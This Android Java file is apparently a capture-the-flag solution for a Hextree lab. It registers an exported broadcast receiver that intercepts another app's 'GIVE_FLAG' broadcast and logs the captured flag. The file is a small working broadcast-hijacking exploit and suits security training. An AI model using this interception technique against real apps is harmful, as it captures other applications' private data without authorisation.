package niraj.patali.hijackthenotificationaction;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
        private static final String TAG = "FlagHijacker";
        private BroadcastReceiver flagReceiver;

        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);

            // Dynamically create the BroadcastReceiver
            flagReceiver = new BroadcastReceiver() {
                @Override
                public void onReceive(Context context, Intent intent) {
                    Bundle extras = intent.getExtras();
                    String flag = extras.getString("flag");
                    Log.i(TAG, "Hijacked Flag: " + flag);
                    Toast.makeText(context, "Captured Flag: " + flag, Toast.LENGTH_LONG).show();

                }
            };

            // Register the receiver dynamically with proper flags
            IntentFilter filter = new IntentFilter("io.hextree.broadcast.GIVE_FLAG");
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) { // Android 13+ (API 33)
                registerReceiver(flagReceiver, filter, Context.RECEIVER_EXPORTED);
            } else {
                registerReceiver(flagReceiver, filter);
            }
        }

        @Override
        protected void onDestroy() {
            super.onDestroy();
            if (flagReceiver != null) {
                unregisterReceiver(flagReceiver);
            }
        }
    }
